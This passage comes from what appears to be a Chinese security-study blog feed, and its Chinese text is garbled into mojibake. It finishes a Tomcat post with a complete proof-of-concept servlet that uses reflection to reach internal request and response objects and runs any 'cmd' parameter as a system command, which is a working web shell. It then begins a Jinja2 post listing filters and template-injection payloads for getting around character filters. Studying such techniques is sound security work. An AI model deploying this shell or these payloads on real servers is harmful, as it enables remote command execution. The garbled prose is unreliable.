<span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//å°†å˜é‡WRAP_SAME_OBJECT_FIELDè®¾ç½®ä¸ºtrueï¼Œå¹¶åˆå§‹åŒ–lastServicedRequestå’ŒlastServicedResponseå˜é‡</span></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>))&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (lastServicedRequestField.get(<span class="literal">null</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (lastServicedResponseField.get(<span class="literal">null</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è·å–requestå˜é‡</span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequestField.get(<span class="literal">null</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (ServletRequest) threadLocal.get();</span><br><span class="line">                System.out.println(servletRequest);</span><br><span class="line">                System.out.println((HttpServletRequest) servletRequest == req);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç¬¬ä¸€æ¬¡è¯·æ±‚å°†requestå’Œresponseå¯¹è±¡å­˜å‚¨è¿›å˜é‡ä¸­ï¼Œç¬¬äºŒæ¬¡è¯·æ±‚æ‰è·å–åˆ°request</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(servletRequest);</span><br><span class="line">System.out.println((HttpServletRequest) servletRequest == req);</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010824372.png"                      alt="image-20230201082439227"                ><figcaption>image-20230201082439227</figcaption></figure></p><h3 id="é€šè¿‡å…¨å±€å­˜å‚¨Responseå›æ˜¾"><a href="#é€šè¿‡å…¨å±€å­˜å‚¨Responseå›æ˜¾" class="headerlink" title="é€šè¿‡å…¨å±€å­˜å‚¨Responseå›æ˜¾"></a>é€šè¿‡å…¨å±€å­˜å‚¨Responseå›æ˜¾</h3><h4 id="Tomcat-9-0-55-Tomcat9-0-71åºŸé™¤äº†org-apache-catalina-loader-WebappClassLoaderBas-getResources"><a href="#Tomcat-9-0-55-Tomcat9-0-71åºŸé™¤äº†org-apache-catalina-loader-WebappClassLoaderBas-getResources" class="headerlink" title="Tomcat:9.0.55 (Tomcat9.0.71åºŸé™¤äº†org.apache.catalina.loader.WebappClassLoaderBas.getResources)"></a>Tomcat:9.0.55 (Tomcat9.0.71åºŸé™¤äº†org.apache.catalina.loader.WebappClassLoaderBas.getResources)</h4><p>åœ¨<code>AbstractProcessor</code>ç±»ä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°å…¨å±€response,åœ¨Tomcatè°ƒç”¨æ ˆä¸­è°ƒç”¨äº†<code>Http11Processor#service</code>æ–¹æ³•,è€Œ<code>Http11Processor</code>ç»§æ‰¿äº†<code>AbstractProcessor</code>ç±»ï¼Œè¿™é‡Œçš„responseå¯¹è±¡æ­£æ˜¯<code>AbstractProcessor</code>ç±»ä¸­çš„å±æ€§ï¼Œå› æ­¤æˆ‘ä»¬å¦‚æœèƒ½è·å–åˆ°<code>Http11Processor</code>ç±»ï¼Œå°±èƒ½è·å–åˆ°responseå¯¹è±¡</p><p>è°ƒç”¨é“¾</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StandardService-----&gt;Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;<span class="built_in">this</span>.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response</span><br></pre></td></tr></table></figure></div><p>å®Œæ•´poc</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardService;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.ProtocolHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebServlet(&quot;/response&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tomcat_Echo_Response</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//è·å–StandardService</span></span><br><span class="line">        org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"> </span><br><span class="line">        System.out.println(standardContext);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//è·å–ApplicationContext</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(standardContext);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è·å–StandardService</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">standardServiceField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            standardServiceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (StandardService) standardServiceField.get(applicationContext);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è·å–Connector</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectorsField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">            connectorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Connector[] connectors = (Connector[]) connectorsField.get(standardService);</span><br><span class="line">            <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> connectors[<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è·å–Handler</span></span><br><span class="line">            <span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connector.getProtocolHandler();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">handlerField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">            handlerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.tomcat.util.net.AbstractEndpoint.<span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è·å–å†…éƒ¨ç±»AbstractProtocol$ConnectionHandlerçš„globalå±æ€§</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">globalHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">            globalHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) globalHandler.get(handler);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è·å–processors</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">processorsField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            processorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è·å–requestå’Œresponse</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">for</span> (RequestInfo requestInfo : requestInfoList)&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//è·å–org.apache.coyote.Request</span></span><br><span class="line">                org.apache.coyote.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//é€šè¿‡org.apache.coyote.Requestçš„Noteså±æ€§è·å–ç»§æ‰¿HttpServletRequestçš„org.apache.catalina.connector.Request</span></span><br><span class="line">                org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">http_request</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) request.getNote(<span class="number">1</span>);</span><br><span class="line">                org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">http_response</span> <span class="operator">=</span> http_request.getResponse();</span><br><span class="line"> </span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> http_response.getWriter();</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> http_request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                scanner.close();</span><br><span class="line">                writer.write(result);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010922036.png"                      alt="image-20230201092245861"                ><figcaption>image-20230201092245861</figcaption></figure></p><h4 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h4><p><a class="link"   href="https://su18.org/post/memory-shell/" >JavaWeb å†…å­˜é©¬ä¸€å‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…« (su18.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/7388#toc-2" >åŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://goodapple.top/archives/1355" >Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog (goodapple.top) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://www.kingkk.com/2020/03/Tomcat%E4%B8%AD%E4%B8%80%E7%A7%8D%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95/" >Tomcatä¸­ä¸€ç§åŠé€šç”¨å›æ˜¾æ–¹æ³• - Kingkkâ€™s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jinjia2 è¿‡æ»¤å™¨</title>
      <link href="/2023/01/16/jinjia2-%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
      <url>/2023/01/16/jinjia2-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="jinjia2-è¿‡æ»¤å™¨"><a href="#jinjia2-è¿‡æ»¤å™¨" class="headerlink" title="jinjia2  è¿‡æ»¤å™¨"></a>jinjia2  è¿‡æ»¤å™¨</h1><p><a class="link"   href="https://forum.butian.net/share/1371" >å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-flask SSTIå­¦ä¹ ä¸æ€»ç»“ (butian.net) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="flask-è¿‡æ»¤å™¨"><a href="#flask-è¿‡æ»¤å™¨" class="headerlink" title="flask è¿‡æ»¤å™¨"></a>flask è¿‡æ»¤å™¨</h2><p>flaskè¿‡æ»¤å™¨å’Œå…¶å®ƒè¯­è¨€çš„è¿‡æ»¤å™¨ä½œç”¨å‡ ä¹ä¸€è‡´ï¼Œå¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤</p><p>ä½¿ç”¨</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å˜é‡|è¿‡æ»¤å™¨</span><br><span class="line">variable|<span class="built_in">filter</span>(args)    </span><br><span class="line">variable|<span class="built_in">filter</span>        //å¦‚æœè¿‡æ»¤å™¨æ²¡æœ‰å‚æ•°å¯ä»¥ä¸åŠ æ‹¬å·</span><br></pre></td></tr></table></figure></div><h3 id="å¸¸ç”¨è¿‡æ»¤å™¨"><a href="#å¸¸ç”¨è¿‡æ»¤å™¨" class="headerlink" title="å¸¸ç”¨è¿‡æ»¤å™¨"></a>å¸¸ç”¨è¿‡æ»¤å™¨</h3><p>**<code>int()</code>**ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›</p><p>**<code>float()</code>**ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›</p><p>**<code>lower()</code>**ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›</p><p>**<code>upper()</code>**ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›</p><p><code>min()</code>:æ±‚åºåˆ—ä¸­æœ€å°å€¼</p><p>**<code>title()</code>**ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›</p><p>**<code>capitalize()</code>**ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›</p><p>**<code>trim()</code>**ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›</p><p>**<code>wordcount()</code>**ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›</p><p>**<code>reverse()</code>**ï¼šå­—ç¬¦ä¸²åè½¬ï¼›</p><p>**<code>replace(value,old,new)</code>**ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›</p><p>**<code>truncate(value,length=255,killwords=False)</code>**ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›</p><p>**<code>striptags()</code>**ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›</p><p>**<code>escape()</code>æˆ–<code>e</code>**ï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†<code>&lt;</code>ã€<code>&gt;</code>ç­‰ç¬¦å·è½¬ä¹‰æˆ<code>HTML</code>ä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼š<code>content|escape</code>æˆ–<code>content|e</code>ã€‚</p><p>**<code>safe()</code>**ï¼š ç¦ç”¨<code>HTML</code>è½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆ<code>safe</code>è¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š<code> &#123;&#123;'<em>hello</em>'|safe&#125;&#125;</code>ï¼›</p><p>**<code>list()</code>**ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›</p><p>**<code>string()</code>**ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›</p><p>**<code>join()</code>**ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢<code>payload</code>ï¼›</p><p>**<code>abs()</code>**ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›</p><p>**<code>first()</code>**ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›</p><p>**<code>last()</code>**ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›</p><p>**<code>format(value,arags,\*kwargs)</code>**ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š<code>&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;å°†è¾“å‡ºï¼šHelloo? - Foo!</code></p><p>**<code>length()</code>**ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›</p><p>**<code>sum()</code>**ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›</p><p>**<code>sort()</code>**ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›</p><p>**<code>default(value,default_value,boolean=false)</code>**ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼š<code>name|default(&#39;xiaotuo&#39;)</code>â€”-å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨<code>xiaotuo</code>æ¥æ›¿ä»£ã€‚<code>boolean=False</code>é»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸º<code>undefined</code>çš„æ—¶å€™æ‰ä¼šä½¿ç”¨<code>default</code>ä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨<code>python</code>çš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸º<code>false</code>ï¼Œåˆ™å¯ä»¥ä¼ é€’<code>boolean=true</code>ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨<code>or</code>æ¥æ›¿æ¢ã€‚</p><h2 id="åŸºæœ¬æ€è·¯"><a href="#åŸºæœ¬æ€è·¯" class="headerlink" title="åŸºæœ¬æ€è·¯"></a>åŸºæœ¬æ€è·¯</h2><h3 id="è·å–å…¥å£ç‚¹"><a href="#è·å–å…¥å£ç‚¹" class="headerlink" title="è·å–å…¥å£ç‚¹"></a>è·å–å…¥å£ç‚¹</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> org = (<span class="variable language_">self</span>|string()) %&#125;&#123;&#123;org&#125;&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> org = <span class="variable language_">self</span>|string|urlencode %&#125;&#123;&#123;org&#125;&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™äº›åŸºæœ¬éƒ½èƒ½å¾—åˆ°ä¸€é•¿ä¸²å­—ç¬¦ä¸²ï¼Œé‡Œé¢åŒ…å«å­—æ¯ã€å°–å·ã€ä¸‹åˆ’çº¿ã€æ•°å­—ç­‰ï¼Œå¯ä»¥é€šè¿‡å¢åŠ ä¸‹æ ‡æ¥è·å–</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125; </span><br><span class="line"><span class="comment"># &lt;generator object select_or_reject at 0x1047f7ac0&gt;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org[<span class="number">1</span>]&#125;&#125;</span><br><span class="line"><span class="comment"># g</span></span><br></pre></td></tr></table></figure></div></blockquote><p>è¿™ä¸ªå¯¹åº”é“å­—ç¬¦ä¸²å«æœ‰ç™¾åˆ†å·ï¼Œè¿™æ ·å¯ä»¥é€šè¿‡urlç¼–ç å¾—åˆ°æ‰€æœ‰å­—ç¬¦</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = <span class="variable language_">self</span>|string|urlencode %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line"><span class="comment"># %3CTemplateReference%20None%3E</span></span><br></pre></td></tr></table></figure></div><p>è¿™ä¸ªåŒ…å«äº†æ›´å¤šçš„å­—ç¬¦ç§ç±»</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line"><span class="comment"># The default undefined type. This undefined type can be printed and iterated over, but every other access will raise an :exc:`UndefinedError`: &gt;&gt;&gt; foo = Undefined(name=&#x27;foo&#x27;) &gt;&gt;&gt; str(foo) &#x27;&#x27; &gt;&gt;&gt; not foo True &gt;&gt;&gt; foo + 42 Traceback (most recent call last): ... 